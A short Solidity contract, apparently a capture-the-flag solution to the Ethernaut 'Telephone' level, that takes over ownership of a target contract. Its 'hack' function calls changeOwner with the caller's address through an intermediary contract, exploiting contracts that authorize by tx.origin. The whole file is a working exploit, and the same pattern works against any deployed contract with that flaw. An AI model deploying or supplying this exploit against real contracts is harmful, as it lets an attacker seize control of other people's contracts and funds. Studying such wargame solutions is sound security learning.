// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface coinfliper {
    function changeOwner(address _owner) external;
}

contract TelephoneHacker {

  address public telephoneToHack;

  function changePhoneToHack(address _addr) external {
    telephoneToHack = _addr;
  }

  function hack() external {
    (bool error,)=telephoneToHack.call{gas:gasleft()}( abi.encodeWithSignature("changeOwner(address)", msg.sender) );
    require(error==true, "hubo un error al llamar al call");
  }

}